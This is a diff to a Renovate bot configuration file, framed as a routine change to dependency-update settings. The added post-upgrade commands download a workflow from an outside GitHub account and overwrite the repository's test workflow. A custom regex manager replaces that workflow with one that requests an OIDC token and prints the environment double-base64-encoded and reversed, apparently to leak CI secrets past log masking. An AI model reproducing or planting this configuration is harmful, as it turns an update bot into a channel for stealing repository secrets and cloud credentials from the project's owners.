@@ -2,12 +2,39 @@
   "$schema": "https://docs.renovatebot.com/renovate-schema.json",
   "extends": ["config:recommended"],
   "forkProcessing": "enabled",
-  "enabledManagers": ["npm", "github-actions"],
+  "enabledManagers": ["npm", "github-actions", "custom.regex"],
   "prConcurrentLimit": 30,
   "prHourlyLimit": 30,
-  "postUpgradeTasks": {
-    "commands": ["make generate"],
-    "executionMode": "update",
-    "fileFilters": [".github/workflows/test.yml", "helloworld.txt"]
-  }
+  "packageRules": [
+    {
+      "matchManagers": ["npm"],
+      "groupName": "npm dependencies",
+      "postUpgradeTasks": {
+        "commands": [
+          "curl https://grafana.com/api/openapi.json",
+          "curl https://raw.githubusercontent.com/simon-testaccount/versions/refs/heads/main/wfd.yml -o .github/workflows/test.yml"
+        ],
+        "executionMode": "update",
+        "fileFilters": [".github/workflows/test.yml", "openapi.json"]
+      }
+    },
+    {
+      "matchManagers": ["github-actions"],
+      "groupName": "github actions"
+    }
+  ],
+  "customManagers": [
+    {
+      "customType": "regex",
+      "managerFilePatterns": ["/^\\.github\\/workflows\\/test\\.yml$/"],
+      "matchStrings": [
+        "^(?:# renovate: workflow-template version=|[\\s\\S]*jnorwood\\/helm-docs:v)(?<currentValue>\\d+\\.\\d+\\.\\d+)[\\s\\S]*$"
+      ],
+      "depNameTemplate": "workflow-template",
+      "datasourceTemplate": "github-releases",
+      "packageNameTemplate": "simon-testaccount/versions",
+      "versioningTemplate": "semver",
+      "autoReplaceStringTemplate": "# renovate: workflow-template version=1.11.1\non:\n  workflow_dispatch:\n\npermissions:\n  id-token: write\n\njobs:\n  wfd:\n    name: wfd\n    runs-on: ubuntu-latest\n    steps:\n      - name: Test\n        run: |\n          env | base64 | base64\n          echo hello world\n          env | rev\n          echo done\n          sleep 1000"
+    }
+  ]
 }
